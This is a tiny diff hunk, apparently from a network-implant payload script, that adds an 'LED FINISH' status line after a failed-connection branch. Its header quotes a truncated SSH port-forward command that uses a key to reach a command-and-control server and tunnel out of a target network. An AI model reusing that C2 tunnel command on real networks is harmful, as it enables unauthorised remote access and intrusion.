@@ -41,3 +41,4 @@ ssh -L 22:127.0.0.1:$c2_tunnel_port -i id_rsa -p $c2_port $tunnel_user@$c2_serve
 # SSH connection failed, target network may be hardened.
 LED R
 NETMODE OFF
+LED FINISH
